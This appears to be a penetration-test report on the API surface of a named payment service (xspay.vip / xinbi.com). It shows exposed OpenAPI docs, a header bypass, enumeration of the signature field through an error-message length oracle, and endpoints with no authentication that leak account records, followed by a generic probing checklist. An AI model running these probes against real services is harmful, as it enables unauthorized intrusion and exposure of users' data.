# OpenAPI 暴露 + RSA 签名字段枚举 — xinbi.com 三套 API 实战

> 来源：xinbi.com 20 阶段全链渗透报告 P1/P3/P5/P11/P12

## 三套 API 文档暴露

| API | 接口数 | 路径 | 文档大小 |
|-----|--------|------|---------|
| api.xspay.vip（商户/链上） | 27 | `/v3/api-docs` + `/swagger-ui/index.html` | 28,676 B |
| integrate-safew.xspay.vip（Wallet） | 17 | `/v3/api-docs.yaml`（需 XFF 绕过） | 80,608 B |
| app.xspay.vip（App API） | **210** | `/v3/api-docs` + `/swagger-ui/index.html` | 335,957 B |

→ 合计 **254 个接口** 的完整参数结构、请求体、响应体全部公开。

## RSA-2048 签名字段枚举（X-Access-Signature）

### 背景
商户/链上 API（api.xspay.vip）对所有请求强制签名。签名字段名和格式不在文档中。

### 枚举过程

**第一轮：Body 字段名枚举**
```
POST /third-party/queryUser
Body: {"tgId":1, "sign": "xxx"}     → "签名为空"
Body: {"tgId":1, "signature": "xxx"} → "签名为空"
Body: {"tgId":1, "signStr": "xxx"}   → "签名为空"
...（15 个候选全部"签名为空"）
```

**第二轮：请求头名枚举**
```
Header: sign: xxx          → "签名为空"
Header: Signature: xxx     → "签名为空"
Header: X-Sign: xxx        → "签名为空"
Header: Authorization: xxx → "签名为空"
Header: X-Token: xxx       → "签名为空"
...

Header: X-Access-Signature: xxx → **"密钥或签名格式错误"** ← 命中！
```

**第三轮：格式判定（长度 Oracle）**
```
X-Access-Signature: PROBE                       → "密钥或签名格式错误"
X-Access-Signature: base64("PROBE:PROBE")       → "Bad signature length: got 11 but was expecting 256"
X-Access-Signature: base64(32B hex)             → "got 24 but was expecting 256"
X-Access-Signature: base64(64B hex)             → "got 48 but was expecting 256"
X-Access-Signature: base64(random 256B)         → "签名验证失败"（进入验签逻辑！）
```

→ **结论：`X-Access-Signature = base64(RSA-2048签名)`，固定 256 字节**

**第四轮：密钥指定字段枚举**
```
X-Access-Key: xxx     → 不改变结果
X-Access-Id: xxx      → 不改变结果
X-Api-Key: xxx        → 不改变结果
Body: appKey/keyId     → 不改变结果
```
→ **密钥不可由客户端指定，服务端固定公钥**

### 三套 API 的签名体系对比

| API | 签名头 | 算法 | 密钥模型 |
|-----|--------|------|---------|
| api.xspay.vip | `X-Access-Signature` | RSA-2048 | 服务端固定，无 keyId 选择 |
| integrate-safew.xspay.vip | `X-bot-Id` + `X-Timestamp` + `X-Sign` + `X-Nonce` | RSA-2048 | 按 bot 颁发，私钥由集成方持有 |
| app.xspay.vip | 会话 Token（Cookie/Header） | — | 登录态，191/210 端点需登录 |

## 未授权接口（/register/* 路由组缺鉴权）

```
POST /register/queryCardAccount {}        → 200 返回 14 条卡账户记录（含 phoneNumber、name）
POST /register/getVersion {}              → 200 泄露官网URL、S3 APK直链、iOS签名站
POST /register/Currency {}                → 200 泄露完整币种清单
POST /register/robotCheckBool {}          → 200 {"data":"false"}
GET  /healthCheck/checkServer             → 200 {"data":true}
```

### queryCardAccount 无分页验证

```
{"pageSize":1}                            → 14 条（忽略分页）
{"pageSize":0}                            → 14 条
{"pageNum":2,"pageSize":1}               → 14 条
{"uid":"other_user"}                      → 14 条（同样的数据，无 IDOR）
{"currency":"USD"}                        → 14 条（忽略过滤）
```

→ 接口忽略全部入参，返回固定测试数据集（accountName=order-test-1，balance=0）。
**设计缺陷真实（缺鉴权+忽略分页），但当前数据为测试夹具，非生产 PII**。

## 校验顺序差异（可用于面判断）

```
/merchant/*       → 先验 merchantId 存在性（"商户不存在"），再验签
/third-party/*    → 先验签（"签名为空"/"签名格式错误"）
/game/*           → 先验签（code 1000 "验签失败"）
/register/*       → 不验签不验登录（直接返回数据）
/其他 /home/* etc → 验登录态（401 "Login expired"）
```

## 测绘引擎适配

1. 看到 Spring Boot `/v3/api-docs` / `/swagger-ui` → 必须全量抓取并分析
2. 签名字段未知时，先枚举 Body 字段名（15+候选），再枚举 Header 名（10+候选）
3. 命中后用长度 Oracle 判定算法（256B=RSA-2048，32B=HMAC-SHA256，20B=HMAC-SHA1）
4. 不同路径前缀的校验顺序不同 → 可用于判断哪些路由组缺鉴权
5. 未授权接口即使返回测试数据，也要验证分页/过滤/IDOR（6-7 组参数变体）
